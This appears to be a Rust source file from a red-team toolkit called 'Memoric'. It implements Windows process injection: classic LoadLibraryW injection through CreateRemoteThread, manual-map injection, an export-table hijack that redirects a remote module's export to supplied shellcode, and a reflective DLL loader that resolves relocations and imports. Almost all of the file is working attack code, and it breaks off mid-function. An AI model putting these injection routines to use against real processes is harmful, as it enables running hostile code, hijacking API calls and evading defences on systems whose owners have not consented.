//! DLL injection implementations

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;
use std::ffi::c_void;

/// Inject DLL using LoadLibraryW (Unicode-safe)
pub fn inject_dll(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let dll_path = args
        .get("dll_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing dll_path".to_string()))?;

    tracing::info!("Injecting DLL '{}' into process {}", dll_path, pid);

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Get LoadLibraryW address for Unicode path support
        let kernel32 = windows::Win32::System::LibraryLoader::GetModuleHandleA(
            windows::core::PCSTR(b"kernel32.dll\0".as_ptr()),
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to get kernel32 handle: {}", e))
        })?;
        let load_library_w = windows::Win32::System::LibraryLoader::GetProcAddress(
            kernel32,
            windows::core::PCSTR(b"LoadLibraryW\0".as_ptr()),
        )
        .ok_or_else(|| {
            MemoricError::InjectionFailed("Failed to get LoadLibraryW address".to_string())
        })?;

        // Encode path as wide string (UTF-16LE) with null terminator
        let wide_path: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
        let path_size = wide_path.len() * 2; // bytes

        let remote_mem = VirtualAllocEx(
            *handle,
            None,
            path_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Failed to allocate remote memory".to_string(),
            ));
        }

        // Write wide DLL path to remote memory
        WriteProcessMemory(
            *handle,
            remote_mem,
            wide_path.as_ptr() as *const _,
            path_size,
            None,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to write remote memory: {}", e))
        })?;

        // Create remote thread to call LoadLibraryW
        let thread = CreateRemoteThread(
            *handle,
            None,
            0,
            Some(std::mem::transmute(load_library_w)),
            Some(remote_mem as *const c_void),
            0,
            None,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to create remote thread: {}", e))
        })?;

        let _thread_handle = SafeHandle::new(thread);
        tracing::info!("DLL injection successful");

        Ok(serde_json::json!({
            "success": true,
            "technique": "LoadLibraryW",
            "remote_address": format!("0x{:016X}", remote_mem as usize)
        }))
    }
}

/// Manual map DLL injection
pub fn manual_map_inject(args: &Value) -> Result<Value, MemoricError> {
    use std::fs;
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let dll_path = args
        .get("dll_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing dll_path".to_string()))?;

    tracing::warn!("[REDTEAM] Manual map injection: {}", dll_path);

    let dll_data = fs::read(dll_path)
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to read DLL: {}", e)))?;

    if dll_data.len() < 64 || dll_data[0] != 0x4D || dll_data[1] != 0x5A {
        return Err(MemoricError::InjectionFailed(
            "Invalid DLL file".to_string(),
        ));
    }

    let pe_offset = u32::from_le_bytes([
        dll_data[0x3C],
        dll_data[0x3D],
        dll_data[0x3E],
        dll_data[0x3F],
    ]) as usize;

    if pe_offset + 24 > dll_data.len()
        || dll_data[pe_offset] != 0x50
        || dll_data[pe_offset + 1] != 0x45
    {
        return Err(MemoricError::InjectionFailed(
            "Invalid PE header".to_string(),
        ));
    }

    let opt_hdr_off = pe_offset + 24;
    let magic = u16::from_le_bytes([dll_data[opt_hdr_off], dll_data[opt_hdr_off + 1]]);
    let is_64 = magic == 0x20B;

    let img_size = if is_64 && opt_hdr_off + 56 <= dll_data.len() {
        u32::from_le_bytes([
            dll_data[opt_hdr_off + 52],
            dll_data[opt_hdr_off + 53],
            dll_data[opt_hdr_off + 54],
            dll_data[opt_hdr_off + 55],
        ]) as usize
    } else if opt_hdr_off + 40 <= dll_data.len() {
        u32::from_le_bytes([
            dll_data[opt_hdr_off + 36],
            dll_data[opt_hdr_off + 37],
            dll_data[opt_hdr_off + 38],
            dll_data[opt_hdr_off + 39],
        ]) as usize
    } else {
        0
    };

    if img_size == 0 {
        return Err(MemoricError::InjectionFailed(
            "Invalid image size".to_string(),
        ));
    }

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let remote_mem = VirtualAllocEx(
            *handle,
            None,
            img_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Failed to allocate memory".to_string(),
            ));
        }

        WriteProcessMemory(
            *handle,
            remote_mem,
            dll_data.as_ptr() as *const _,
            dll_data.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to write DLL: {}", e)))?;

        // W^X: mark image as RX after writing
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            remote_mem,
            img_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to set RX protection: {}", e))
        })?;

        let ep_rva = if is_64 && opt_hdr_off + 20 <= dll_data.len() {
            u32::from_le_bytes([
                dll_data[opt_hdr_off + 16],
                dll_data[opt_hdr_off + 17],
                dll_data[opt_hdr_off + 18],
                dll_data[opt_hdr_off + 19],
            ])
        } else {
            0
        };

        let entry: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(if ep_rva > 0 {
                (remote_mem as usize + ep_rva as usize) as *const ()
            } else {
                remote_mem as *const ()
            });

        let thread = CreateRemoteThread(
            *handle,
            None,
            0,
            Some(entry),
            Some(remote_mem as *const _),
            0,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to create thread: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "manual_map",
            "dll_size": dll_data.len(),
            "image_size": img_size,
            "remote_address": format!("0x{:016X}", remote_mem as usize),
            "thread_handle": thread.0 as u64
        }))
    }
}

/// Export forwarding hijack — overwrite an export RVA in a remote module's export table
/// to redirect calls to injected shellcode.
pub fn export_forwarding_hijack(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HMODULE;
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };
    use windows::Win32::System::ProcessStatus::{
        EnumProcessModulesEx, GetModuleBaseNameW, LIST_MODULES_ALL,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
        PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let module_name = args
        .get("module")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing module".to_string()))?;
    let export_name = args
        .get("export_name")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing export_name".to_string()))?;
    let shellcode_arr = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;

    let shellcode: Vec<u8> = shellcode_arr
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();

    if shellcode.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECTION] Export forwarding hijack: {}!{} in PID {}",
        module_name,
        export_name,
        pid
    );

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess failed: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Enumerate modules in remote process to find target module base
        let mut modules = vec![HMODULE::default(); 1024];
        let mut cb_needed = 0u32;
        EnumProcessModulesEx(
            *handle,
            modules.as_mut_ptr(),
            (modules.len() * std::mem::size_of::<HMODULE>()) as u32,
            &mut cb_needed,
            LIST_MODULES_ALL,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("EnumProcessModulesEx failed: {}", e)))?;

        let num_modules = cb_needed as usize / std::mem::size_of::<HMODULE>();
        let target_lower = module_name.to_lowercase();
        let mut module_base: usize = 0;

        for i in 0..num_modules {
            let mut name_buf = [0u16; 260];
            let name_len = GetModuleBaseNameW(*handle, modules[i], &mut name_buf);
            if name_len == 0 {
                continue;
            }
            let name = String::from_utf16_lossy(&name_buf[..name_len as usize]).to_lowercase();
            if name == target_lower || name.contains(&target_lower) {
                module_base = modules[i].0 as usize;
                break;
            }
        }

        if module_base == 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "Module '{}' not found in PID {}",
                module_name, pid
            )));
        }

        // Read PE headers from remote process
        let mut dos_header = [0u8; 64];
        ReadProcessMemory(
            *handle,
            module_base as *const c_void,
            dos_header.as_mut_ptr() as *mut _,
            64,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read DOS header failed: {}", e)))?;

        if dos_header[0] != 0x4D || dos_header[1] != 0x5A {
            return Err(MemoricError::InjectionFailed(
                "Invalid MZ signature in remote module".to_string(),
            ));
        }

        let e_lfanew = u32::from_le_bytes([
            dos_header[0x3C],
            dos_header[0x3D],
            dos_header[0x3E],
            dos_header[0x3F],
        ]) as usize;

        // Read NT headers + optional header to get export directory
        let mut nt_buf = [0u8; 280];
        ReadProcessMemory(
            *handle,
            (module_base + e_lfanew) as *const c_void,
            nt_buf.as_mut_ptr() as *mut _,
            280,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read NT headers failed: {}", e)))?;

        // Export directory RVA is at optional header offset 112 (data dir index 0)
        let export_dir_rva = u32::from_le_bytes([
            nt_buf[24 + 112],
            nt_buf[24 + 113],
            nt_buf[24 + 114],
            nt_buf[24 + 115],
        ]) as usize;
        if export_dir_rva == 0 {
            return Err(MemoricError::InjectionFailed(
                "No export directory in module".to_string(),
            ));
        }

        // Read export directory (40 bytes)
        let mut export_dir = [0u8; 40];
        ReadProcessMemory(
            *handle,
            (module_base + export_dir_rva) as *const c_void,
            export_dir.as_mut_ptr() as *mut _,
            40,
            None,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Read export directory failed: {}", e))
        })?;

        let num_names = u32::from_le_bytes([
            export_dir[24],
            export_dir[25],
            export_dir[26],
            export_dir[27],
        ]) as usize;
        let functions_rva = u32::from_le_bytes([
            export_dir[28],
            export_dir[29],
            export_dir[30],
            export_dir[31],
        ]) as usize;
        let names_rva = u32::from_le_bytes([
            export_dir[32],
            export_dir[33],
            export_dir[34],
            export_dir[35],
        ]) as usize;
        let ordinals_rva = u32::from_le_bytes([
            export_dir[36],
            export_dir[37],
            export_dir[38],
            export_dir[39],
        ]) as usize;

        // Read names array
        let mut name_rvas = vec![0u32; num_names];
        ReadProcessMemory(
            *handle,
            (module_base + names_rva) as *const c_void,
            name_rvas.as_mut_ptr() as *mut _,
            num_names * 4,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read name RVAs failed: {}", e)))?;

        // Read ordinals array
        let mut ordinals = vec![0u16; num_names];
        ReadProcessMemory(
            *handle,
            (module_base + ordinals_rva) as *const c_void,
            ordinals.as_mut_ptr() as *mut _,
            num_names * 2,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read ordinals failed: {}", e)))?;

        // Find the target export name
        let mut found_ordinal: Option<usize> = None;
        for i in 0..num_names {
            let mut name_buf = [0u8; 256];
            if ReadProcessMemory(
                *handle,
                (module_base + name_rvas[i] as usize) as *const c_void,
                name_buf.as_mut_ptr() as *mut _,
                256,
                None,
            )
            .is_ok()
            {
                let end = name_buf.iter().position(|&b| b == 0).unwrap_or(256);
                let name = String::from_utf8_lossy(&name_buf[..end]);
                if name == export_name {
                    found_ordinal = Some(ordinals[i] as usize);
                    break;
                }
            }
        }

        let ordinal = found_ordinal.ok_or_else(|| {
            MemoricError::InjectionFailed(format!("Export '{}' not found", export_name))
        })?;

        // Read the original RVA for this function
        let func_rva_addr = module_base + functions_rva + ordinal * 4;
        let mut original_rva_bytes = [0u8; 4];
        ReadProcessMemory(
            *handle,
            func_rva_addr as *const c_void,
            original_rva_bytes.as_mut_ptr() as *mut _,
            4,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read function RVA failed: {}", e)))?;
        let original_rva = u32::from_le_bytes(original_rva_bytes);

        // Allocate shellcode in remote process
        let sc_mem = VirtualAllocEx(
            *handle,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if sc_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx for shellcode failed".to_string(),
            ));
        }

        // Write shellcode
        WriteProcessMemory(
            *handle,
            sc_mem,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write shellcode failed: {}", e)))?;

        // Change shellcode to RX
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            sc_mem,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
        .map_err(|e| {
            MemoricError::WindowsApi(format!("VirtualProtectEx shellcode RX failed: {}", e))
        })?;

        // Calculate new RVA: shellcode_address - module_base
        let new_rva = (sc_mem as usize - module_base) as u32;
        let new_rva_bytes = new_rva.to_le_bytes();

        // Overwrite the export RVA in the AddressOfFunctions table
        let mut old_prot2 = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            func_rva_addr as *mut _,
            4,
            PAGE_READWRITE,
            &mut old_prot2,
        )
        .map_err(|e| {
            MemoricError::WindowsApi(format!("VirtualProtectEx export table failed: {}", e))
        })?;

        WriteProcessMemory(
            *handle,
            func_rva_addr as *const _,
            new_rva_bytes.as_ptr() as *const _,
            4,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write new RVA failed: {}", e)))?;

        let _ = VirtualProtectEx(
            *handle,
            func_rva_addr as *mut _,
            4,
            old_prot2,
            &mut old_prot2,
        );

        Ok(serde_json::json!({
            "success": true,
            "technique": "export_forwarding_hijack",
            "original_rva": format!("0x{:08X}", original_rva),
            "new_address": format!("0x{:016X}", sc_mem as usize),
            "new_rva": format!("0x{:08X}", new_rva),
            "export_name": export_name,
            "module": module_name,
            "module_base": format!("0x{:016X}", module_base),
            "pid": pid,
            "message": format!("Export {}!{} RVA hijacked to shellcode at 0x{:016X}", module_name, export_name, sc_mem as usize)
        }))
    }
}

/// Reflective DLL injection — full injector-side PE loader
/// Maps sections, processes relocations, resolves imports, and calls DllMain
/// all via cross-process RPM/WPM. No shellcode generation needed.
pub fn reflective_dll_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?
        as u32;
    let dll_path = args
        .get("dll_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing dll_path".to_string()))?;

    tracing::warn!(
        "[INJECTION] Reflective DLL inject: {} -> PID {}",
        dll_path,
        pid
    );

    let dll_bytes = std::fs::read(dll_path)
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to read DLL: {}", e)))?;

    if dll_bytes.len() < 64 || dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
        return Err(MemoricError::InjectionFailed("Invalid PE file".to_string()));
    }

    // Parse PE headers
    let e_lfanew = read_u32(&dll_bytes, 0x3C) as usize;
    if e_lfanew + 0x108 > dll_bytes.len()
        || dll_bytes[e_lfanew] != 0x50
        || dll_bytes[e_lfanew + 1] != 0x45
    {
        return Err(MemoricError::InjectionFailed(
            "Invalid PE signature".to_string(),
        ));
    }

    let nt = e_lfanew;
    let file_hdr = nt + 4;
    let num_sections = read_u16(&dll_bytes, file_hdr + 2) as usize;
    let opt_hdr_size = read_u16(&dll_bytes, file_hdr + 16) as usize;
    let opt_hdr = file_hdr + 20;
    let magic = read_u16(&dll_bytes, opt_hdr);
    if magic != 0x20B {
        return Err(MemoricError::InjectionFailed(
            "Only PE32+ (x64) DLLs supported".to_string(),
        ));
    }

    let entry_point_rva = read_u32(&dll_bytes, opt_hdr + 16) as usize;
    let image_base = read_u64(&dll_bytes, opt_hdr + 24);
    let size_of_image = read_u32(&dll_bytes, opt_hdr + 56) as usize;
    let size_of_headers = read_u32(&dll_bytes, opt_hdr + 60) as usize;

    // Data directories (opt_hdr + 112)
    let dd_base = opt_hdr + 112;
    let import_dir_rva = read_u32(&dll_bytes, dd_base + 8) as usize; // dir[1]
    let reloc_dir_rva = read_u32(&dll_bytes, dd_base + 40) as usize; // dir[5]
    let reloc_dir_size = read_u32(&dll_bytes, dd_base + 44) as usize;

    // Section headers start after optional header
    let sections_off = opt_hdr + opt_hdr_size;

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Allocate full image in remote process (RW initially)
        let remote_base = VirtualAllocEx(
            *handle,
            None,
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_base.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx failed".to_string(),
            ));
        }
        let remote_base_addr = remote_base as usize;

        // 1. Write PE headers
        let hdr_len = size_of_headers.min(dll_bytes.len());
        WriteProcessMemory(
            *handle,
            remote_base,
            dll_bytes.as_ptr() as *const _,
            hdr_len,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write headers: {}", e)))?;

        // 2. Map each section to its virtual address
        let mut sections_mapped = 0usize;
        for i in 0..num_sections {
            let sh = sections_off + i * 40;
            if sh + 40 > dll_bytes.len() {
                break;
            }
            let virt_addr = read_u32(&dll_bytes, sh + 12) as usize;
            let raw_size = read_u32(&dll_bytes, sh + 16) as usize;
            let raw_ptr = read_u32(&dll_bytes, sh + 20) as usize;

            if raw_size == 0 || raw_ptr == 0 {
                continue;
            }
            if raw_ptr + raw_size > dll_bytes.len() {
                continue;
            }

            let dest = (remote_base_addr + virt_addr) as *mut c_void;
            WriteProcessMemory(
                *handle,
                dest,
                dll_bytes[raw_ptr..].as_ptr() as *const _,
                raw_size,
                None,
            )
            .map_err(|e| MemoricError::InjectionFailed(format!("Write section {}: {}", i, e)))?;
            sections_mapped += 1;
        }

        // 3. Process relocations (delta = remote_base - preferred image_base)
        let delta = remote_base_addr as i64 - image_base as i64;
        let mut relocs_applied = 0usize;
        if delta != 0 && reloc_dir_rva != 0 && reloc_dir_size != 0 {
            relocs_applied = apply_relocations_remote(
                *handle,
                &dll_bytes,
                remote_base_addr,
                reloc_dir_rva,
                reloc_dir_size,
                delta,
            )?;
        }

        // 4. Resolve imports in remote process
        let mut imports_resolved = 0usize;
        if import_dir_rva != 0 {
            imports_resolved =
                resolve_imports_remote(*handle, &dll_bytes, remote_base_addr, import_dir_rva)?;
        }

        // 5. Set proper section protections
        for i in 0..num_sections {
            let sh = sections_off + i * 40;
            if sh + 40 > dll_bytes.len() {
                break;
            }
            let virt_addr = read_u32(&dll_bytes, sh + 12) as usize;
            let virt_size = read_u32(&dll_bytes, sh + 8) as usize;
            let characteristics = read_u32(&dll_bytes, sh + 36);

            if virt_size == 0 {
                continue;
            }

            let prot = section_characteristics_to_protection(characteristics);
            let mut old_prot = PAGE_PROTECTION_FLAGS(0);
            let _ = VirtualProtectEx(
                *handle,
                (remote_base_addr + virt_addr) as *mut _,
                virt_size,
                prot,
                &mut old_prot,
            );
        }

        // 6. Create remote thread at DllMain (entry point)
        // DllMain signature: BOOL WINAPI DllMain(HINSTANCE, DWORD fdwReason, LPVOID)
        // We use a small trampoline stub to call DllMain with correct args
        // Allocate trampoline: call DllMain(hModule, DLL_PROCESS_ATTACH=1, NULL)
        let ep_addr = remote_base_addr + entry_point_rva;
        let trampoline = build_dllmain_trampoline(remote_base_addr as u64, ep_addr as u64);

        let tramp_mem = VirtualAllocEx(
            *handle,
            None,
            trampoline.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if !tramp_mem.is_null() {
            WriteProcessMemory(
                *handle,
                tramp_mem,
                trampoline.as_ptr() as *const _,
                trampoline.len(),
                None,
            )
            .ok();
            let mut old_prot = PAGE_PROTECTION_FLAGS(0);
            VirtualProtectEx(
                *handle,
                tramp_mem,
                trampoline.len(),
                PAGE_EXECUTE_READ,
                &mut old_prot,
            )
            .ok();

            let thread = CreateRemoteThread(
                *handle,
                None,
                0,
                Some(std::mem::transmute(tramp_mem)),
                None,
                0,
                None,
            )
            .map_err(|e| MemoricError::InjectionFailed(format!("CreateRemoteThread: {}", e)))?;

            return Ok(serde_json::json!({
                "success": true,
                "technique": "reflective_dll_inject",
                "remote_base": format!("0x{:016X}", remote_base_addr),
                "entry_point": format!("0x{:016X}", ep_addr),
                "image_size": size_of_image,
                "sections_mapped": sections_mapped,
                "relocations_applied": relocs_applied,
                "imports_resolved": imports_resolved,
                "delta": delta,
                "thread_handle": thread.0 as u64,
                "pid": pid,
                "message": format!(
                    "Reflective DLL mapped at 0x{:016X}, {} sections, {} relocs, {} imports, EP at 0x{:016X}",
                    remote_base_addr, sections_mapped, relocs_applied, imports_resolved, ep_addr
                )
            }));
        }

        Err(MemoricError::InjectionFailed(
            "Failed to allocate trampoline".to_string(),
        ))
    }
}

/// Apply base relocations in remote process memory
fn apply_relocations_remote(
    handle: windows::Win32::Foundation::HANDLE,
    dll_bytes: &[u8],
    remote_base: usize,
    reloc_rva: usize,
    reloc_size: usize,
    delta: i64,
) -> Result<usize, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};

    // Find relocation data in raw file by converting RVA to file offset
    let reloc_file_off = rva_to_file_offset(dll_bytes, reloc_rva).ok_or_else(|| {
        MemoricError::InjectionFailed("Cannot find relocation data in file".to_string())
    })?;

    let mut offset = 0usize;
    let mut count = 0usize;

    while offset < reloc_size {
        let pos = reloc_file_off + offset;
        if pos + 8 > dll_bytes.len() {
            break;
        }

        let page_rva = read_u32(dll_bytes, pos) as usize;
        let block_size = read_u32(dll_bytes, pos + 4) as usize;

        if block_size < 8 || block_size > reloc_size {
            break;
        }

        let num_entries = (block_size - 8) / 2;

        for i in 0..num_entries {
            let entry_off = pos + 8 + i * 2;
            if entry_off + 2 > dll_bytes.len() {
                break;
            }

            let entry = read_u16(dll_bytes, entry_off);
            let reloc_type = entry >> 12;
            let reloc_offset = (entry & 0x0FFF) as usize;

            if reloc_type == 0 {
                continue;
            } // IMAGE_REL_BASED_ABSOLUTE (padding)

            let patch_addr = remote_base + page_rva + reloc_offset;

            unsafe {
                if reloc_type == 10 {
                    // IMAGE_REL_BASED_DIR64: patch 8-byte address
                    let mut old_val = [0u8; 8];
                    let mut old_prot = PAGE_PROTECTION_FLAGS(0);
                    let _ = VirtualProtectEx(
                        handle,
                        patch_addr as *mut _,
                        8,
                        PAGE_READWRITE,
                        &mut old_prot,
                    );
                    if ReadProcessMemory(
                        handle,
                        patch_addr as *const _,
                        old_val.as_mut_ptr() as *mut _,
                        8,
                        None,
                    )
                    .is_ok()
                    {
                        let original = u64::from_le_bytes(old_val);
                        let patched = (original as i64 + delta) as u64;
                        WriteProcessMemory(
                            handle,
                            patch_addr as *const _,
                            patched.to_le_bytes().as_ptr() as *const _,
                            8,
                            None,
                        )
                        .ok();
                        count += 1;
                    }
                    let _ =
                        VirtualProtectEx(handle, patch_addr as *mut _, 8, old_prot, &mut old_prot);
                } else if reloc_type == 3 {
                    // IMAGE_REL_BASED_HIGHLOW: patch 4-byte address
                    let mut old_val = [0u8; 4];
                    let mut old_prot = PAGE_PROTECTION_FLAGS(0);
                    let _ = VirtualProtectEx(
                        handle,
                        patch_addr as *mut _,
                        4,
                        PAGE_READWRITE,
                        &mut old_prot,
                    );
                    if ReadProcessMemory(
                        handle,
                        patch_addr as *const _,
                        old_val.as_mut_ptr() as *mut _,
                        4,
                        None,
                    )
                    .is_ok()
                    {
                        let original = u32::from_le_bytes(old_val);
                        let patched = (original as i64 + delta) as u32;
                        WriteProcessMemory(
                            handle,
                            patch_addr as *const _,
                            patched.to_le_bytes().as_ptr() as *const _,
                            4,
                            None,
                        )
                        .ok();
                        count += 1;
                    }
                    let _ =
                        VirtualProtectEx(handle, patch_addr as *mut _, 4, old_prot, &mut old_prot);
                }
            }
        }

        offset += block_size;
    }

    Ok(count)
}

/// Resolve imports in remote process by writing correct function addresses to IAT
fn resolve_imports_remote(
    handle: windows::Win32::Foundation::HANDLE,
    dll_bytes: &[u8],
    remote_base: usize,
    import_dir_rva: usize,
) -> Result<usize, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::LibraryLoader::{
        GetProcAddress as WinGetProcAddress, LoadLibraryA,
    };
    use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};

    let import_off = rva_to_file_offset(dll_bytes, import_dir_rva).ok_or_else(|| {
        MemoricError::InjectionFailed("Cannot find import directory in file".to_string())
    })?;

    let mut count = 0usize;
    let mut desc_off = import_off;

    // Walk IMAGE_IMPORT_DESCRIPTORs (20 bytes each, null-terminated)
    loop {
        if desc_off + 20 > dll_bytes.len() {
            break;
        }

        let original_first_thunk = read_u32(dll_bytes, desc_off) as usize;
        let name_rva = read_u32(dll_bytes, desc_off + 12) as usize;
        let first_thunk = read_u32(dll_bytes, desc_off + 16) as usize;

        // Null terminator check
        if name_rva == 0 && first_thunk == 0 {
            break;
        }

        // Read DLL name
        let name_off = rva_to_file_offset(dll_bytes, name_rva).unwrap_or(0);
        if name_off == 0 {
            desc_off += 20;
            continue;
        }

        let dll_name_end = dll_bytes[name_off..]
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(0);
        let dll_name =
            std::str::from_utf8(&dll_bytes[name_off..name_off + dll_name_end]).unwrap_or("");

        if dll_name.is_empty() {
            desc_off += 20;
            continue;
        }

        // Load the dependency DLL in our own process to get function addresses
        // (assuming same base addresses — works for system DLLs like kernel32, ntdll, etc.)
        let mut dll_name_cstr = dll_name.as_bytes().to_vec();
        dll_name_cstr.push(0);

        unsafe {
            let dep_module =
                LoadLibraryA(windows::core::PCSTR(dll_name_cstr.as_ptr())).unwrap_or_default();
            if dep_module.is_invalid() {
                desc_off += 20;
                continue;
            }

            // Walk thunk entries (ILT → use original_first_thunk, IAT → write to first_thunk)
            let ilt_rva = if original_first_thunk != 0 {
                original_first_thunk
            } else {
                first_thunk
            };
            let ilt_off = rva_to_file_offset(dll_bytes, ilt_rva).unwrap_or(0);
            if ilt_off == 0 {
                desc_off += 20;
                continue;
            }

            let mut thunk_idx = 0usize;
            loop {
                let thunk_file_off = ilt_off + thunk_idx * 8;
                if thunk_file_off + 8 > dll_bytes.len() {
                    break;
                }

                let thunk_val = read_u64(dll_bytes, thunk_file_off);
                if thunk_val == 0 {
                    break;
                }

                let func_addr: usize;

                if thunk_val & 0x8000000000000000 != 0 {
                    // Import by ordinal
                    let ordinal = (thunk_val & 0xFFFF) as u16;
                    let proc = WinGetProcAddress(
                        dep_module,
                        windows::core::PCSTR(ordinal as usize as *const u8),
                    );
